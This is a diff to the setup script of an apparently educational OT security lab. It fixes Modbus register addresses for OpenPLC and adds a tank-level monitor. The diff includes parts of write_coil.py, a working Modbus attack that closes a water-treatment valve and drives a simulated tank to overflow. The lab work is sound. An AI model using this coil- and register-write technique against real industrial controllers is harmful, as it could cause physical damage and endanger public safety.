@@ -178,10 +178,10 @@ Coil map (Tutorial 01 — pump_control program):
     Coil 1  valve_open   FALSE=valve closed, TRUE=valve open
     Coil 2  emrg_stop    FALSE=normal,       TRUE=emergency tripped
 
-Holding register map:
-    HR 0  tank_level   Tank level in cm  (500 = 5.00 m, 1000 = 10.00 m overflow)
-    HR 1  inlet_flow   Inlet flow rate   (L/min; >0 means pump is running)
-    HR 2  outlet_flow  Outlet flow rate  (L/min; >0 means valve is open)
+Holding register map (OpenPLC %MW variables start at Modbus address 1024):
+    HR 1024  tank_level   Tank level in cm  (500 = 5.00 m, 1000 = 10.00 m overflow)
+    HR 1025  inlet_flow   Inlet flow rate   (L/min; >0 means pump is running)
+    HR 1026  outlet_flow  Outlet flow rate  (L/min; >0 means valve is open)
 """
 
 import os
@@ -245,16 +245,17 @@ print()
 # ── FC03 Read Holding Registers 0–2 ──────────────────────────────────────────
 print("=== HOLDING REGISTERS  (Modbus FC03 — Read Holding Registers) ===")
 try:
-    reg_result = client.read_holding_registers(address=0, count=3, device_id=1)
+    # OpenPLC %MW variables start at Modbus HR address 1024 (MIN_16B_RANGE in modbus.cpp).
+    reg_result = client.read_holding_registers(address=1024, count=3, device_id=1)
     if hasattr(reg_result, 'isError') and reg_result.isError():
         print(f"[error] read_holding_registers failed: {reg_result}")
     else:
         for idx in range(3):
             raw   = reg_result.registers[idx]
             label = REG_LABELS.get(idx, f'reg_{idx}')
-            # HR 0 stores level in cm — show human-readable meters alongside
+            # HR 1024 stores level in cm — show human-readable meters alongside
             display = f"{raw} cm  ({raw / 100.0:.2f} m)" if idx == 0 else str(raw)
-            print(f"  HR   {idx}  {label:<35} {display}")
+            print(f"  HR{1024+idx}  {label:<35} {display}")
 except (ModbusException, Exception) as e:
     print(f"[error] read_holding_registers raised exception: {e}")
 
@@ -275,12 +276,12 @@ write_coil.py — Modbus coil write attack against the Tutorial 01 water treatme
 Default action  (no flags):  ATTACK  — close outlet valve, keep pump running.
                               Inlet water accumulates with no outlet path.
                               After writing the coil, a timed loop directly
-                              increments HR 0 (tank_level) by 5 cm every 500 ms
-                              via FC06 Write Single Register so the overflow is
-                              immediately visible in the OT canvas animation.
+                              increments HR 1024 (tank_level %MW0) by 5 cm every
+                              500 ms via FC06 Write Single Register so the overflow
+                              is immediately visible in the OT canvas animation.
 
 With --restore:              RESTORE — stop pump, open outlet valve.
-                              A timed loop then decrements HR 0 by 5 cm every
+                              A timed loop then decrements HR 1024 by 5 cm every
                               500 ms until the tank is empty, reversing the damage.
 
 Both modes keep the Modbus connection open for the duration of the loop.
@@ -392,18 +393,20 @@ if not RESTORE_MODE:
     print("    To restore:  python3 write_coil.py --restore")
     print()
 
+    # OpenPLC maps %MW0 (tank_level) to Modbus HR address 1024, not address 0.
+    # Addresses 0–1023 are %IW/%QW input/output words; reading them returns zeroes.
     # If the PLC baseline was not pre-seeded by the init script (level < 50 cm),
-    # seed HR 0 to 500 cm now so the overflow effect starts from a visible level.
+    # seed HR 1024 to 500 cm now so the overflow effect starts from a visible level.
     try:
-        chk = client.read_holding_registers(address=0, count=1, device_id=1)
+        chk = client.read_holding_registers(address=1024, count=1, device_id=1)
         if not (hasattr(chk, 'isError') and chk.isError()):
             if chk.registers[0] < 50:
-                client.write_register(address=0, value=500, device_id=1)
+                client.write_register(address=1024, value=500, device_id=1)
                 print("[*] Tank level seeded to 500 cm (init script had not run).")
     except Exception:
         pass
 
-    # Timed rise loop — reads HR 0, adds 5 cm, writes back every 500 ms.
+    # Timed rise loop — reads HR 1024 (%MW0 = tank_level), adds 5 cm, writes back every 500 ms.
     # Combined with the PLC scan (+5 cm/scan at 500 ms), the level rises at
     # roughly 20 cm/s — visible overflow from 500 cm in about 25 seconds.
     print("[*] Incrementing tank level 5 cm every 500 ms via FC06 Write Register.")
@@ -411,11 +414,11 @@ if not RESTORE_MODE:
     try:
         while True:
             try:
-                reg = client.read_holding_registers(address=0, count=1, device_id=1)
+                reg = client.read_holding_registers(address=1024, count=1, device_id=1)
                 if not (hasattr(reg, 'isError') and reg.isError()):
                     lvl     = min(reg.registers[0], 1000)
                     new_lvl = min(lvl + 5, 1000)
-                    client.write_register(address=0, value=new_lvl, device_id=1)
+                    client.write_register(address=1024, value=new_lvl, device_id=1)
                     print(f"\r{_bar(new_lvl)}", end='', flush=True)
                     if new_lvl >= 1000:
                         print()
@@ -436,17 +439,17 @@ else:
     print("    Coil 0 = FALSE (pump OFF) | Coil 1 = TRUE (valve OPEN)")
     print()
 
-    # Timed drain loop — reads HR 0, subtracts 5 cm, writes back every 500 ms.
+    # Timed drain loop — reads HR 1024 (%MW0 = tank_level), subtracts 5 cm, writes back every 500 ms.
     print("[*] Decrementing tank level 5 cm every 500 ms via FC06 Write Register.")
     print("[*] Watch the Water Tank icon in the OT canvas. Press Ctrl+C to stop.\n")
     try:
         while True:
             try:
-                reg = client.read_holding_registers(address=0, count=1, device_id=1)
+                reg = client.read_holding_registers(address=1024, count=1, device_id=1)
                 if not (hasattr(reg, 'isError') and reg.isError()):
                     lvl     = min(reg.registers[0], 1000)
                     new_lvl = max(lvl - 5, 0)
-                    client.write_register(address=0, value=new_lvl, device_id=1)
+                    client.write_register(address=1024, value=new_lvl, device_id=1)
                     print(f"\r{_bar(new_lvl)}", end='', flush=True)
                     if new_lvl <= 0:
                         print()
@@ -543,14 +546,15 @@ except (ModbusException, Exception) as e:
     print(f"[plc-init] write_coil(1) exception: {e}")
     success = False
 
-# ── HR 0: tank_level → 500 (5.00 m, 50% capacity) ────────────────────────────
+# ── HR 1024: tank_level → 500 (5.00 m, 50% capacity) ─────────────────────────
+# OpenPLC maps %MW0 (tank_level) to Modbus HR address 1024 (MIN_16B_RANGE).
 try:
-    r = client.write_register(address=0, value=500, device_id=1)
+    r = client.write_register(address=1024, value=500, device_id=1)
     if hasattr(r, 'isError') and r.isError():
-        print(f"[plc-init] write_register(HR0) error: {r}")
+        print(f"[plc-init] write_register(HR1024) error: {r}")
         success = False
     else:
-        print("[plc-init] HR 0  (tank_level)  → 500   (5.00 m, 50% capacity)")
+        print("[plc-init] HR 1024 (tank_level)  → 500   (5.00 m, 50% capacity)")
 except (ModbusException, Exception) as e:
     print(f"[plc-init] write_register(HR0) exception: {e}")
     success = False
@@ -567,10 +571,108 @@ PYEOF
 
 chmod +x /root/Desktop/Attack_Scripts/plc_init.py
 
+# ── monitor_level.py ──────────────────────────────────────────────────────────
+# Continuously polls HR 1024 (tank_level %MW0) and displays a live ASCII bar.
+# Run this in one terminal while write_coil.py runs in another to observe the
+# rising level numerically, mirroring what the OT canvas animation shows.
+cat > /root/Desktop/Attack_Scripts/monitor_level.py << 'PYEOF'
+#!/usr/bin/env python3
+"""
+monitor_level.py — Live tank-level monitor for Tutorial 01.
+
+Polls HR 1024 (%MW0 = tank_level on OpenPLC) every 1 second and prints a
+continuously-updating ASCII bar graph so students can see the rising level
+numerically in the terminal as the attack progresses.
+
+Usage:
+    python3 monitor_level.py           # poll every 1 s (default)
+    python3 monitor_level.py --fast    # poll every 0.5 s
+    Press Ctrl+C to stop.
+
+Environment variables (set automatically by the simulation):
+    PLC_IP    IP address of the target PLC  (default: 10.200.10.10)
+    PLC_PORT  Modbus TCP port               (default: 502)
+
+OpenPLC Modbus register map:
+    HR 1024  tank_level   cm   (0 = empty, 1000 = overflow at 10.00 m)
+    HR 1025  inlet_flow   L/min
+    HR 1026  outlet_flow  L/min
+"""
+
+import os
+import sys
+import time
+
+try:
+    from pymodbus.client import ModbusTcpClient
+    from pymodbus.exceptions import ModbusException
+except ImportError:
+    print("[error] pymodbus not installed. Run: pip3 install pymodbus")
+    sys.exit(1)
+
+PLC_IP    = os.environ.get('PLC_IP',   '10.200.10.10')
+PLC_PORT  = int(os.environ.get('PLC_PORT', '502'))
+INTERVAL  = 0.5 if '--fast' in sys.argv else 1.0
+
+client = ModbusTcpClient(PLC_IP, port=PLC_PORT)
+try:
+    connected = client.connect()
+except Exception as e:
+    connected = False
+    print(f"[error] Connection exception: {e}")
+
+if not connected:
+    print(f"[error] Cannot connect to {PLC_IP}:{PLC_PORT} — is the simulation running?")
+    sys.exit(1)
+
+print(f"[*] Connected to {PLC_IP}:{PLC_PORT}  (poll interval: {INTERVAL:.1f} s)")
+print(f"[*] Monitoring HR 1024 (tank_level), HR 1025 (inlet_flow), HR 1026 (outlet_flow)")
+print(f"[*] Press Ctrl+C to stop.\n")
+print(f"  {'LEVEL BAR':^42}  LEVEL    PCT    IN     OUT    STATUS")
+print(f"  {'─'*42}  {'─'*6}  {'─'*5}  {'─'*6}  {'─'*6}  {'─'*8}")
+
+try:
+    while True:
+        try:
+            # Read HR 1024–1026: tank_level, inlet_flow, outlet_flow
+            result = client.read_holding_registers(address=1024, count=3, device_id=1)
+            if hasattr(result, 'isError') and result.isError():
+                print("\r  [error reading registers]", end='', flush=True)
+            else:
+                lvl     = min(result.registers[0], 1000)
+                q_in    = result.registers[1]
+                q_out   = result.registers[2]
+                pct     = lvl / 10.0
+                n_fill  = int(pct / 5)       # 0–20 filled blocks
+                bar     = '█' * n_fill + '░' * (20 - n_fill)
+
+                if   pct < 50:  status = "NORMAL  "
+                elif pct < 80:  status = "ELEVATED"
+                elif pct < 100: status = "CRITICAL"
+                else:           status = "OVERFLOW"
+
+                print(
+                    f"\r  [{bar}]  {lvl:4d}cm  {pct:5.1f}%  "
+                    f"{q_in:5d}  {q_out:5d}  {status}",
+                    end='', flush=True
+                )
+        except (ModbusException, Exception) as e:
+            print(f"\r  [poll error: {e}]", end='', flush=True)
+
+        time.sleep(INTERVAL)
+
+except KeyboardInterrupt:
+    print("\n[*] Monitoring stopped.")
+    client.close()
+PYEOF
+
+chmod +x /root/Desktop/Attack_Scripts/monitor_level.py
+
 echo "[otforge-attack] Attack_Scripts created:"
-echo "[otforge-attack]   /root/Desktop/Attack_Scripts/read_coils.py  — read coil + register state"
-echo "[otforge-attack]   /root/Desktop/Attack_Scripts/write_coil.py  — coil write attack (--restore to undo)"
-echo "[otforge-attack]   /root/Desktop/Attack_Scripts/plc_init.py    — re-seed PLC baseline (pump=ON, valve=OPEN, level=500)"
+echo "[otforge-attack]   /root/Desktop/Attack_Scripts/read_coils.py    — read coil + register state (one-shot)"
+echo "[otforge-attack]   /root/Desktop/Attack_Scripts/write_coil.py    — coil write attack (--restore to undo)"
+echo "[otforge-attack]   /root/Desktop/Attack_Scripts/plc_init.py      — re-seed PLC baseline (pump=ON, valve=OPEN, level=500)"
+echo "[otforge-attack]   /root/Desktop/Attack_Scripts/monitor_level.py — live tank-level bar (--fast for 0.5 s poll)"
 
 # ── PLC Modbus baseline initialization ────────────────────────────────────────
 # Runs in the background so VNC/noVNC startup is not delayed.
